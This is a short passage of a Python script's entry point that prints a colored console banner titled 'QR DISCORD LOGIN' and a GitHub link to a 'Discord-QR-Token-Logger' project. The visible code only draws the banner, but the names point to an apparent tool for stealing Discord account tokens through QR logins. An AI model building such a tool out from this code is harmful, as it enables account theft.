...
if __name__ == "__main__":
    ...
    System.Title("QR DISCORD LOGIN - By wz#0045 (mouadessalim)")
    System.Size(140, 35)
    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Center.GroupAlign(Box.DoubleCube("By wz#0045 (mouadessalim)")),
            1,
        )
    )
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Box.Lines("https://github.com/witchstick/Discord-QR-Token-Logger").replace(
                "ቐ", "$"
            ),
            1,
        ),
